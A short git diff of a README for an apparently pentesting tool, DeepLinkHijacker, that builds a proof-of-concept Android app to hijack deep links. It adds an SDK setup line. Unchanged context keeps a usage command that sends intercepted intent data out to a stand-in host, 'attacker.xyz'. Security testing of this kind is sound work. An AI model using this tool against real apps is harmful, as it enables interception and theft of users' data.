@@ -15,6 +15,8 @@ Modifies the deep link scheme and host portions of the AndroidManifest.xml of a 
 Python3
 
 adb (Android Debug Bridge) - Optional. Only required for the install option.
+
+Android SDK: replace the /path/to/Android/Sdk in the local.properties file
 <br><br>
 
 ## Usage
@@ -68,3 +70,4 @@ Create the PoC app, use a custom domain to exfiltrate intent data and installs i
 python3 DeepLinkHijacker.py -l "testApp://test/" -d "attacker.xyz" -i
 
 ```
+
